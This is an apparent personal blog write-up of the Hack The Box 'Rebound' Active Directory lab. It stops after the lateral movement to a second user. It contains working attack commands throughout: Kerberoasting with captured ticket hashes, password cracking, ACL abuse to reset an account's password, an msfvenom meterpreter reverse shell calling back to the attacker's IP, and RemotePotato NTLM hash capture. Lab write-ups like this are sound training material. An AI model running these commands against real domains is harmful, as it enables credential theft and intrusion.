---
title:  "HTB Rebound Writeup"
date:   2024-03-30 00:30:00 
categories: HTB Machine
tags: AD remote_potato RBCD GMSA
---

![Rebound](/assets/img/Rebound/1694107808107.jpg)

## Introduction 

This machine was one of the hardest I've done so far but I learned so much from it. This Active Directory based machine combined a lot of common attacks within these environments with a few more niche ones. Additionally the creator did implement some of the security measures to make exploitation of things that look trivial significantly harder. All in all this box might have given me quite some frustration but in the end it felt great finishing this machine

If you like any of my content it would help a lot if you used my referral link to buy Hack The Box/Academy Subscriptions which you can find on my about page.

## Initial access
### Recon

To start off our recon we will begin with an Nmap scan of the machine. Using the following command:
```
sudo nmap -sS -A -p- -v -oN nmap 10.10.11.231
```
**Nmap**
```
# Nmap 7.94 scan initiated Sun Sep 10 09:28:14 2023 as: nmap -sS -A -p- -v -oN nmap 10.10.11.231
Nmap scan report for 10.10.11.231
Host is up (0.039s latency).
Not shown: 65508 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-09-10 20:29:20Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: rebound.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2023-09-10T20:30:36+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.rebound.htb
| Issuer: commonName=rebound-DC01-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-08-25T22:48:10
| Not valid after:  2024-08-24T22:48:10
| MD5:   6605:cbae:f659:f555:d80b:7a18:adfb:6ce8
|_SHA-1: af8b:ec72:779e:7a0f:41ad:0302:eff5:a6ab:22f0:1c74
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: rebound.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.rebound.htb
| Issuer: commonName=rebound-DC01-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-08-25T22:48:10
| Not valid after:  2024-08-24T22:48:10
| MD5:   6605:cbae:f659:f555:d80b:7a18:adfb:6ce8
|_SHA-1: af8b:ec72:779e:7a0f:41ad:0302:eff5:a6ab:22f0:1c74
|_ssl-date: 2023-09-10T20:30:36+00:00; +7h00m00s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: rebound.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2023-09-10T20:30:36+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.rebound.htb
| Issuer: commonName=rebound-DC01-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-08-25T22:48:10
| Not valid after:  2024-08-24T22:48:10
| MD5:   6605:cbae:f659:f555:d80b:7a18:adfb:6ce8
|_SHA-1: af8b:ec72:779e:7a0f:41ad:0302:eff5:a6ab:22f0:1c74
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: rebound.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.rebound.htb
| Issuer: commonName=rebound-DC01-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-08-25T22:48:10
| Not valid after:  2024-08-24T22:48:10
| MD5:   6605:cbae:f659:f555:d80b:7a18:adfb:6ce8
|_SHA-1: af8b:ec72:779e:7a0f:41ad:0302:eff5:a6ab:22f0:1c74
|_ssl-date: 2023-09-10T20:30:36+00:00; +7h00m00s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49671/tcp open  msrpc         Microsoft Windows RPC
49672/tcp open  msrpc         Microsoft Windows RPC
49685/tcp open  msrpc         Microsoft Windows RPC
49698/tcp open  msrpc         Microsoft Windows RPC
49718/tcp open  msrpc         Microsoft Windows RPC
49780/tcp open  msrpc         Microsoft Windows RPC
60241/tcp open  msrpc         Microsoft Windows RPC
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94%E=4%D=9/10%OT=53%CT=1%CU=32240%PV=Y%DS=2%DC=T%G=Y%TM=64FDC4F
OS:C%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=10B%TI=I%CI=I%II=I%SS=S%TS=
OS:U)OPS(O1=M53CNW8NNS%O2=M53CNW8NNS%O3=M53CNW8%O4=M53CNW8NNS%O5=M53CNW8NNS
OS:%O6=M53CNNS)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)ECN(R=Y%
OS:DF=Y%T=80%W=FFFF%O=M53CNW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=
OS:0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=80%W=0%S
OS:=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=
OS:Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=
OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T
OS:=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=80%CD=
OS:Z)

Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=258 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2023-09-10T20:30:29
|_  start_date: N/A
|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59s

TRACEROUTE (using port 554/tcp)
HOP RTT      ADDRESS
1   38.94 ms 10.10.14.1
2   38.93 ms 10.10.11.231

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Sep 10 09:30:36 2023 -- 1 IP address (1 host up) scanned in 141.72 seconds


```
When reviewing the Nmap output we can see that this was a typical domain controller without any other services open. Based on this, the plan of attack is to see if we can get any information out of the domain controller using anonymous logon.

### Dumping all users

So the first thing I'd check is if it's possible to dump all users objects anonymously from the domain controller. With the following command it was possible to get all the available users within the domain using null sessions.

```bash
netexec smb 10.10.11.231 -u 'anonymous' -p '' --rid-brute 100000
```

![Rebound](/assets/img/Rebound/Rebound_01.png)

After removing all the groups that can in no way could be used to login we end up with the following list. This list we can then use for further attacks:

```
Administrator
Guest
krbtgt
DC01$
ppaul
llune
fflock
jjones
mmalone
nnoon
ldap_monitor
oorend
ServiceMgmt
winrm_svc
batch_runner
tbrady
delegator$
```

### Kerberoasting

Now that we have a full list of all users present within the domain controller there are a few things we can try, such as empty passwords or username is password. These didn't work here but we were able to obtain quite a few kerberos tickets using **impackets GetUserSPN's**. Using the following command we were able to obtain some kerberos tickets we could then try to crack using hashcat.

```bash
impacket-GetUserSPNs -target-domain rebound.htb -usersfile users.txt -dc-ip dc01.rebound.htb rebound.htb/guest -no-pass
```

If you get an error of **clock skew is too great**. Run the following command and try the previous command again. This can happen whenever your machine is not in sync with the target machine, when this is the case you need to sync your time with the domain controller.

```bash
sudo ntpdate -u rebound.htb
```

![Kerberoasting working](/assets/img/Rebound/Rebound_02.png)

In the output of this command we can see that there are multiple kerberoastable accounts and that they have multiple etypes. This means that cracking them would require a slightly different command for the different types. Below I'll list all the different hashes that came out of this command. 

We end up with one etype 23 hash and 3 etype 18.

**etype 23 hashes**
```
$krb5tgs$23$*ldap_monitor$REBOUND.HTB$ldap_monitor*$480e9f8cb9df7b330ebbed2120683847$368b8d38887f5b2111f7a634c4eff1246ab48fad020fe599525dd09ca1efa9929a1ab0bf709f04bbd9200183a0e390a5da728b069c3ba411862700880137b63f666e67bddf91ddb356f6bf05920e13750f710eefbc52e3000ffd44d71e4c604ad2eab0db377cfb116dc2fcf2a5056377e816cc1d7b53c59d46bfb62cb1fbe7f7e3e0c3536d4a2aa22a85d5b0fce63974ceeedb31920ae6755225c23a2194c53e241b1ad71dee25a8b3734d33339e8bcc93fc50226600f813ec006a315179522094cfbf4fbb32f9dcfaddb5345fa83c25fc69cc913a88b19a4d668dbdbdae4c0559ce26a162a9bafef255af3ea04723d6b0ed8f477b85aaeb896fef4dea1aaf9b8391f75f69f9fa5790e3396808e20816c06e832e64028a0891e8ed6b2e336c4b7bdb504229c3f17c5cd50f734c287a754333de133508966ec91e6cf838c584eabf0a3330d54b34623c300383e5204423fea9e65b02ff8661cbc8ee8ab68dcdd19b820b64a5578cac9c05f140910abf0f86855ebb4473ef8364ee18cc28ed0d93c934337780b880d8429285941465efbc532c6a4c5c01ad131e3589a3e36fe0e2dc7472587980f190dd95ab460055c11462ffa0506e239f541f854f0fbe49d2548393f7147959557731c96a0dfca35600539f6b62cf0f899c566383ac82ee93052ace25743f019f748ee2895f0b3b59f90661ab7e57f56ee1b04ecd42b42d7c18331eb6634a401dc38b723276a8e7842e67f9a954c2232aafd433ddebb46106e8067aaf9955650b3dc8563f871f478567a1f830f4e7a6400eacd5c3c3e7e48f836eec2b3a0c2e00ee9ae6bb6c8e4c28b65a38869611b54400c0ea4e9e41809cfa2f25ebee145e3567e1fa76f48a4ac1d5c6add34f2e43f6165fceb2f1ee8dfec2e423a5a783a5dc872ef492e81c0aa63eeb8e8388ddb75f923ce8b5695da145b8f0eba29c42e9521bf699894048d46811cc00509e995e6f1a2afb6b425fb9ef8fd13bebf58c8d439b495f7a7166f69db77f6b93db290279cd8b734810d4111f85ded550dec9f6f83acdb22f48c118bda4e6138fd58274fa2efb2a0e730630a4ec77876df6a64dc3ad879918133190c42cd379f69f26967cc2db9a7f1bde67ac5e965440ab58535814a9f71737bcfea691c96b2eba22a9e30aee0aa76507ceebc8b8112cad0591fb362d42c2afb109c88cb5eb15eaec589897276d5c56c12aa5081bf1e43f0d35b094c604abcbadcb95e9b7602fd1e6fd58baecd967cda3bed1e7f9c6f134aa16ea2d89506e72796f84269ff80432cf34d9f73e3eaa5ebe53f127bf0359dd496f24db473b151b3f412edaa9767347e1f08aa324a247386316852cf1210f8abe98e4935902cffbe319e1d30314992b54aa4bc45bf38edce174f31a6638a594feb15a072a59a031ca4c0735bb9069348a31adeea6
```

**etype 18 hashes**
```
$krb5tgs$18$krbtgt$REBOUND.HTB$*krbtgt*$c5671c978919f76b7ea1b337$d2312b38ef3dcdd8f2c18f8e3f7f25a9296fbe2e1de920ab0941f9833147f6d5ddab3bfc6ecff0f0fe5a6da33671d1a634083e467261b89f8dae723754129a522baac43ef881275d2c6a2c49aa764c92111fe35d9b78fae531c4917522e38ad7fc4cf9fbd53c6427c5b05f8ba5325fd20e02ebe2e190c2096fea8273889fa60574967ace6dc910aa01f9e8da6868029946ff870537ff8ebec665d868ff8c1583298e795d10d7e51251b6b64f2f39496797cd1f8d0257cf0d1e1229274ee6a4330c0414c41a74425c1f8df7fa574272c446ac6f496e2bdc430a8c5b71a75c9fc76bdadc959557996d4257607da56f5afc79c19185b862daa3749d86cef44dd829f570e6c27c8c034ecaf1bda01463ab2ce76dfb6d0d25e32fa14db338165b8ba5cdf8d6d89a0fe4b0e999adc29e050b18f1756c8f30c4a55fa2e11538ebe26004fc0c0e1c6317949974759072e9c9e57d5a510ec6e80eee09b3ad3ba7433f4011bb7b09de1ca2ea004bd1a913428e9d5b243c6eb49fb0ba7e4b17fb228da166f2840443945ce116d79057c2c81aeb3f4b673d506b9a09e62a57d7573a78f8aced6823d1e9a4fb2237f007f582f95098c6b4b462b809016b0a8a3c828314ba3033422e2e3e3b39fbca500ad7be512d0bbce05bd16ede211f3a65101ebe503053a259f7beff9e2432e1b30e0947f7ece274ddc5f69fe5cb72e1150f0e81f9116753b344d244a4d645006b984299cca73777430ffef030e9d757213e4a2c57858eaef761469dabda1a80aab47bcded9628cd074f632553bf7aaefd3e1fbc8ef74f8617af944ba29af97c4eac904ab010dc6f61f9cb731d0996b495fae10320e3684783308cc8b7ba7980126d692fd1cebcf4820df62720efb9109a049f641f5970df27ddb56cfcceab505404724de5a621ca4300eaac3df53b6dbf35618370595b5de7f2d3375484ea3307e9986168319037abaf49546f61e4d54f87aac039ab08cf8da0d237176822a746040b3d3e9aa0136ced451aee7b9d0b254f3bce1034d447dc4df4a7161f6a6f17e06c4ea14aa9b75bfa8b8bc7829c33edddfd6311e9354dc928da81bc4a34e9f7ba5f13e49d77e803c18d8edbd25fd5fd6587234650fefb0766ca7a3d918af9feeba0efc03ef8398ca18a134c0cbbb880dd83798da4ce3e8bd087d70f0ad91371f2cca190fe18458cc46e1dd1bc8c413c7504bfe67badcaf0f17ebfa3cffdf2cdf457ba38cf50deebafc3a2e3c7eab9e4e87a76913ad637ef14b2a9115128fe4e1e4762b8e9ea9eaa172b7b1e1f0741d883db13c68a9d45860e6089284fc68169fba6f76557af525b0075bff859b1ff585976428c4d3fece4d96a29a48ccf182d50fd8da477026af65a96e982fe33d0341b20da57c2b3ca3cf34bd256b00a3038d9eedbae27b0706aee23821679e627ce4b3be2c94fab7537
$krb5tgs$18$DC01$$REBOUND.HTB$*DC01$*$8b4ba2b99574f2303d3d2756$2054eb3384dbc828584689761dd8fd7e469b32516b3b33bb2d0ce0de49596126f9ef4d21fd2d02085ba8ce48935eb62564e64e934fca97d8b51bbe9da7d1f9040e503399571dbd039eca811d5fdd37c3c92c6e625db53b6630425365f3e2223b8e427b3e8dfc980986ee5a791c14485bc308a933f5b8ee5a8e0a1c48a19f34781e8363873a97646bbae90006ba125e518403976d5cf166e7b0f691a262cdcc09092059f912306bcd2daab5915a3ae4eacd9b01d66618f70b542e54ad0e626b02a2af9bd27d667a7c2c7c871c6c1e881c7323683d422eefd3e0cf090ee2249d7005c1a689aee2a7d065ff226348426f290ee5ca1a8dd12f57f610761c938cea93fad2d690756648d11c7907d8b0cb10d1e2f1649c5f1bf656ab96357b2d1e60953cfeca2fd685131ad88f91e844a70ae8cb510966f1db96a7676457ee38e5d7fe0305dbf61e289a7c90366143fad2ca019bb6ee476e7cf6798f7a8fc1b649ab1850060581ebf9359584abc51451338dec9e7f7db9bf79ad5494cecc8a19f68dd7dadce51a160ffba8ac3d106939306655ea498e109a0e2235b87f15b111efa03d47fb4a75a52f90784cfab0a587b0e9c097feb0910a08366069b5ef2e518821de5a29a73bcba381be41220d5d24d465355042b40ff3af339092650c001be324300b5759735fbd63f5471858db27f24e552d97d5e0e03e9940aa12a9e6822435a19fe74aa35279b9db62fc0fab01c16b62a3d5d2eb622081bc70b6b1d737f60009bd2934793ee2a05c8faac52a3e06ede592da6bda0db7be5b48bdc623fea07f4464b10435030555aa0cf6d13dcaf5aaf8a2d36bbfc545e16704f20f69d470792c31b6e5b171c9ca0a9c51dbc9c87db1d91b27ec8593dc22337703599b7289f7d484d288c6aa6f3ebee3145a2daebe409faf7e0ff8f551210cc2ee0d0b5d2ad81cc2fb346a0dce85cd426a267375fe20cc79749f51b1403bccdde8be919a63b35bbdb0576863df4da9ca87f47522bfa54d36e5913ce80d8cc7119d5d2f29d80a94b24455c48cf35756d558f89a2dd9b40802db3026cfd9507bad372325592f522373f8b8f3516302852b641a3bd11e7d40e656d186d045e86146f561b751c7febd0c4c592d0b138d8cb2f5abd0e095f923b732493e37e3d2251e6aac183ad2517b5d731b87a9081f229e5cf40768049757a94fc3b20dc966039209e7805e81de6e3ca511a51b1e04fa2ccf8cb434b7dc139b2396663ea4327db7c6454a9f5ce485cc8b0154593cab174878f37bdab5992cecd11066c21e85ba9fd6146099b13f0d86670fbdc7ec57a92b8d782795b1739c5e1a15cac17e85748025c306fea9a13a86ee42d4853d2d5159e808b9a796a21b086382dcfe6fae62efc3c1675bf6e31280c47155df13f7f9febe281796bc39f6ea368670a848ac3e9a
$krb5tgs$18$delegator$$REBOUND.HTB$*delegator$*$c4bfd25327e51d3f477c194e$085a0f75479399d2095c6ce57fee1b2f0abc61714720bbb5832883cd901f9116b0bc7dfbf6814f33be2d05333d0be048f140100e5cbb3ff35211c275ec8c6709c9481385c0115f1aa4326dd717db2aa74c328b3e17986067c155e5ffecd3fc9d5e7a7be5075188626380f469ecaee6852429cdfa7416a5ed3dd8e8c46ca17dcb7e2e5b1e43329d94ca6024679b0178357b2605f87499dbb7c056a21d5ae4d70d9e68a7112e3e51eed1a7c81668d36149236d9633e23f7b2feb5708801ff018c4d62e1a49252f3f6407c73106dfd183bac1fe98782f991ec62928bb00668467ff23573c80a0f4dee0b994c68e0b10340a53066b3aa9fe85754dba1c8dae22b55fd6acf08283fd25a61d1b96b97b58ae402814cb51ca9a264f8d37456b8f1892ff4c9ad8d3a1a98c6008af67a191cde1e647d03f077175d0a7ded2123ca93957e6b09d4333878839ebda74e276781b93d3208c3000bdd5a38a1cabe09448cb33d348531f1fa5e1e5a66a9f34f89aa6244d488bc291a09a009f1d566454a153ed04a3faf975b52a188e18c29f9a13b4b588790442a91aeb0669691aa27d280a8055231fb7ad97fa9c2ad063f00065288da70ca5da0cb2004158e9d338835ff1d1173f9c88a1d24f069c6e6e472a5f97efb3452c0e3361b7e1dcabb9c75a74b261e99a865ced4c4ce3bdbc174b6cbb09d12c590f1ab9e7c3706df6b2cb7b10cc6ffaac29f7c303432f294ee6d12faeb48a97913033dd8081513dc58b9626a83983794cd30c2af8c80ad1eaf24aa54a19aa69091c608c9bb4bb720ef749f8e04833e6e39ad005a16319be4886ffe54119f22229b35470dbd81ba2be66c78660bda9caf539bbaac6269dc8fb68ae84021eccb405fb539f4c8daeeed282683b10e2129d4a185359d72f7106c92a453555ee257733878e6b5e8cbc947b5a474401a5315744413a7009c3f1af1eaced00254c8c320d2af6fa7f7c94af70f7bedfc74267dda1a1196d05b283251bdafb419723111f3d5bd9081d3ba75e76de6233336f0e045171d66b9c1b9fa8067fbc531c4303cbac36ce5a24ab1deb0f626ae9051e23b47d584a9ccd9961218ce89a70f27722ca023fdb81392655d134a2071ebc2d0e170ff14fffff415235d044db3b282c032a5549abce8af323ef99d1563d105d7b75053f3f3c5330b55af9e531fad57f53bde82473202d20a21c65c62880475c34a7bc93d68393a80c548ebc05192d774e3ec904324e81f23afeebea18dfee5b6b9c4aea5d1da83c4737b11358a4be7109ea5d19b21f7e5e056856696e3b53903f82790682a1566d6a52172b706613b942226417c03507305b2bcd56f0ffed3e6f4d08a6b41309ee50470b1c46638ed17f8c518c638f3936ab4ce4dea532a77924be5e687bf7511e0827a263631b4247c00b3f11c7a0da3da484f6
```

Now that we have a list of hashes, we can try to crack these using hashcat using the following commands. I decided to try and crack both sets of hashes at the same time. In the end the etype 23 hashes were successful but I'll include the command to crack the etype 18 hashes as well.

**cracking etype 23**
```bash
hashcat -a 0 -m 13100 krb23-hash /usr/share/wordlists/rockyou.txt -w 3 -O
```
**cracking etype 18**
```bash
hashcat -a 0 -m 19700 krb18-hashes /usr/share/wordlists/rockyou.txt -w 3 -O
```

After a few moments we can see that the password of **ldap_monitor** is **1GR8t@$$4u**

![Hash cracked](/assets/img/Rebound/Rebound_03.png)

With this we have our first account compromise and this will be a big step forward to further compromising the domain.

### Password re-use

So my first step was to try and connect to ldap with this user but this was not the case. We were not able to run bloodhound so my next step was to check if there is any user that using the same password as as **ldap_monitor**. After running the following command we could see that the **oorend**  account also used the exact same password:

```bash 
netexec smb 10.10.11.231 -u ./Kerberoasting/users.txt -p '1GR8t@$$4u' --no-bruteforce --continue-on-succes --shares
```

![Password re-use](/assets/img/Rebound/Rebound_04.png)

### Bloodhound analysis

#### Setup

Now that we have a credentials of an actual account we are able to run bloodhound to obtain a copy of the full domain controller's configuration. Before we can do this we need to first install [bloodhound](https://github.com/SpecterOps/BloodHound). We can do this fairly easily by running the following command as it will spin up a docker container for us.

```bash
curl -L https://ghst.ly/getbhce | sudo docker-compose -f - up
```

After creating your account and logging in you'll be greeted with the following front page. Here we go into the settings menu to download the latest collectors.

![Download latest collector 1](/assets/img/Rebound/Rebound_05.png)

![Download latest collector 2](/assets/img/Rebound/Rebound_06.png)


Next we need to move these collectors to a windows machine and unzip them. After doing this we need to open a session as the oorend user using runas. Doing this we will be able to interact with the domain controller as if we were using a domain joined device.

```powershell
runas /netonly /user:rebound.htb\oorend cmd
1GR8t@$$4u
```

Next up we need to run sharphound with the following parameters to get all information from the domain controller.

```powershell
SharpHound.exe -d rebound.htb -c all --domaincontroller 10.10.11.231 --ldapusername oorend --ldappassword 1GR8t@$$4u
```

Now that we have bloodhound output we can upload it in bloodhound in the ingestors tab.

![Upload data](/assets/img/Rebound/Rebound_07.png)

After uploading the bloodhound information we can start our anaylsis.


#### SERVICEMGMT@REBOUND.HTB GenericAll on SERVICE USERS@REBOUND.HTB

While analysing the bloodhound output I noticed a few things, I did not see a direct path to domain administrator but a few things were quite odd to look at. First of all the **SERVICEMGMT@REBOUND.HTB** has GenericAll permission on the OU **SERVICE USERS@REBOUND.HTB**. This basically means that any user within this group would be able to modify all objects contained within this OU.

![GenericAll](/assets/img/Rebound/Rebound_08.png)

At this moment the users PPaul and FFlock have access to this service so at this point in time we would not be able to exploit this but we might if we get access to these users or get another user added to this group.

![Users Servicemgmt](/assets/img/Rebound/Rebound_09.png)

Next we can see that the accounts WINRM_SVC and BatchRunner are present within the service users. So these users we'd be able to compromise if we were to get access to the servicemgmt group. Judging by the name I'd say that the user WINRM_SVC would be able to get shell access to the system using winrm.

![Users service users ](/assets/img/Rebound/Rebound_10.png)

#### Tbrady access to GMSA account DELEGATOR$@REBOUND.HTB

Another thing that was special was that **Tbrady** had access to the GMSA account **DELEGATOR$**. GMSA are Group Managed Service accounts and essence are just accounts that other users can obtain the credentials for whenever needed. So this means that **Tbrady** is able to fetch the credentials of this account. Bloodhound doesn't show any interesting information for this account however seeing the name I have a feeling this account might have delegation rights. We will confirm later.

![GMSA account ](/assets/img/Rebound/Rebound_11.png)

#### Conclusion bloodhound

After analysing the bloodhound output, I wasn't able to find a direct way to become domain admin. However the two paths we did find do look very interesting, we just need to do more enumeration to connect the dots.


### Enumeration with powerview

So we needed to get some extra information to try and connect the dots. We can see a clear path from the ServiceMgt group to winrm_svc user. After that we would have access to the system itself. Here we might be able to get access to other accounts. Besides this we can also see a clear path from the Tbrady account to the delegator$ account. Judging by the name i would say that the delegator$ account might be able to kerberos delegation. Additionally we don't know a way to the Servicemgt group so we'll try to see if we can get access to this system with for example access control entry (ACE).

#### Delegator$ kerberos delegation

First of all we could see that our suspiciouns that the delegator account indeed is allowed to perform delegation. We can use the following  powerview commands to verify this. This shows that the delegator account is allowed to do kerberos delegation.

```powershell
import-module .\powerview
Get-DomainComputer -TrustedToAuth 2>$null
```

![Delegation](/assets/img/Rebound/Rebound_12.png)

So this confirms our suspiciouns. The account is allowed to do kerberos delegation and we will be able to abuse this to get domain administrator level access..

#### Oorend self enrollment

Next i decided to list all the Access Control Entrees (ACE) of the servicemgmt group. Basically this shows what objects have permissions to actions on this object. With the following command you're able to output all of these. In typical environments this can output a massive list of permissions which can make it tedious to analyze these.

```powershell
Get-ObjectAcl -SAMAccountName SERVICEMGMT
```

While analyzing the different ACE's one that really stood out. Here we can see that the user with SID **S-1-5-21-4078382237-1492182817-2568127209-7682**. is allowed to self enroll themselves into the group. The next step is to figure out who matches this SID.

```
AceType               : AccessAllowed
ObjectDN              : CN=ServiceMgmt,CN=Users,DC=rebound,DC=htb
ActiveDirectoryRights : Self
OpaqueLength          : 0
ObjectSID             : S-1-5-21-4078382237-1492182817-2568127209-7683
InheritanceFlags      : None
BinaryLength          : 36
IsInherited           : False
IsCallback            : False
PropagationFlags      : None
SecurityIdentifier    : S-1-5-21-4078382237-1492182817-2568127209-7682
AccessMask            : 8
AuditFlags            : None
AceFlags              : None
AceQualifier          : AccessAllowed
```

When looking in bloodhound we can see that the **oorend** user matches this SID

![Oorend allowed to self enrollment](/assets/img/Rebound/Rebound_30.png)


### Compromising winrm_svc

After all our enumeration, the path becomes a little bit more clear. Now that we know that oorend can enroll themselves into the group we can abuse this by using [bloodyad](https://github.com/CravateRouge/bloodyAD). With the following account we are able to add our own user to the servicemgmt group.

```bash
./bloodyAD.py -u oorend -d rebound.htb -p '1GR8t@$$4u' --host 10.10.11.231 add groupMember servicemgmt oorend
```
![Group enrollment](/assets/img/Rebound/Rebound_13.png)


Now that this user is present in this group we can now use our new permissions to add a generic all on the **SERVICE USERS** for our user specifically, we'll need this to later exploit the **winrm_svc** user within.

```bash
./bloodyAD.py -u oorend -d rebound.htb -p '1GR8t@$$4u' --host 10.10.11.231 add genericAll 'OU=SERVICE USERS,DC=REBOUND,DC=HTB' oorend
```
![Generic all](/assets/img/Rebound/Rebound_14.png)


Now that we have the generic all on the service users we can now use this to set the password of winrm_svc to whatever we want using the following command:

```bash
./bloodyAD.py -u oorend -d rebound.htb -p '1GR8t@$$4u' --host 10.10.11.231 set password  winrm_svc Calico123
```

![Password changed](/assets/img/Rebound/Rebound_15.png)

Now that we changed the password succesfully we can now use evilwinrm to connect to the server as the user winrm_svc using our newly set p assword.

```bash
evil-winrm -i 10.10.11.231 -u winrm_svc -p 'Calico123'
```

![Access using winrm](/assets/img/Rebound/Rebound_16.png)


Now if you want to fully compromise the account in one line you can use the following command.

```bash 
./bloodyAD.py -u oorend -d rebound.htb -p '1GR8t@$$4u' --host 10.10.11.231 add groupMember servicemgmt oorend;./bloodyAD.py -u oorend -d rebound.htb -p '1GR8t@$$4u' --host 10.10.11.231 add genericAll 'OU=SERVICE USERS,DC=REBOUND,DC=HTB' oorend;./bloodyAD.py -u oorend -d rebound.htb -p '1GR8t@$$4u' --host 10.10.11.231 set password  winrm_svc Calico123;evil-winrm -i 10.10.11.231 -u winrm_svc -p 'Calico123'
```

## Lateral movement

Now that we have command execution on the system, I noticed that the cleanup script ended up killing my winrm quite often so I decided to create a new reverse shell with metasploit to make my life a bit easier.

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.227 LPORT=443 -f exe > Calico.exe
```

Next we could start our listener with the following command.

```
msfconsole -x "use exploit/multi/handler;set payload windows/x64/meterpreter/reverse_tcp;set LHOST tun0;set LPORT 443;run;"
```

Next we need to get our Metasploit reverse shell onto the machine. I did this by setting up a python webserver so we can download the shell onto the machine:

```bash 
python -m http.server 80
```

Next we downloaded our shell onto the machine using wget. After downloading it we need to execute it as well.

```bash
wget "http://10.10.14.227/Calico.exe" -outfile "Calico.exe"
```

![Meterpreter shell](/assets/img/Rebound/Rebound_17.png)

Then a moment later we get a callback onto our Meterpreter reverse shell handler.

![Meterpreter shell](/assets/img/Rebound/Rebound_18.png)


### winrm_svc -> tbrady

After re-running the sharphound collector on the target i could see that tbrady has a session on this machine. Knowing he has a session here we can try to abuse the [remotepotato](https://github.com/antonioCoco/RemotePotato0) exploit. In essence this allows us to force another user on the same machine to send their netntlm hash to use which we can then relay. Relaying it won't help us get code exec instantly since tbrady is not local admin on this machine. But if we are able to crack the hash of tbrady we would be able to use it.

So first of all we need to setup a relay using socat. With the following command we can do this.

```bash
sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:10.10.11.231:9999
```
Next we setup our ntlmrelay with **impacket-ntlmrelayx** if everything went well we should see something like this.


```bash 
sudo impacket-ntlmrelayx -t ldap://10.10.11.231 --no-wcf-server
```
![Meterpreter shell](/assets/img/Rebound/Rebound_19.png)

Next we download the remotepotato exe file onto our machine using wget.

```powershell
wget "http://10.10.14.227/r.exe" -outfile "r.exe"
```
Next we use remotepotato using mode Module 2 - Rpc capture (hash) server + potato trigger. This will force tbrady to connect to our relay allowing us to grab the hash.

```powershell
.\r.exe -m 2 -r 10.10.14.227 -x 10.10.14.227 -p 9999 -s 1
```
![Tbrady hash captured](/assets/img/Rebound/Rebound_20.png)

Here we can see that the following hash been captured:

```
tbrady::rebound:92a3855579a8f20d:11e8cd6fda0d90f2a9bcf6386124a00d:0101000000000000cae97abf9181da01077fd4a590bc73030000000002000e007200650062006f0075006e006400010008004400430030003100040016007200650062006f0075006e0064002e006800740062000300200064006300300031002e007200650062006f0075006e0064002e00680074006200050016007200650062006f0075006e0064002e0068007400620007000800cae97abf9181da01060004000600000008003000300000000000000001000000002000002d01a4ce80329853a1379cc0c402248b2a1253b68fa5319c60aff8d0fec96e0f0a00100000000000000000000000000000000000090000000000000000000000
```

Our next step is to try and crack this hash. After a few moments we'll see that tbrady's password is **543BOMBOMBUNmanda**
```
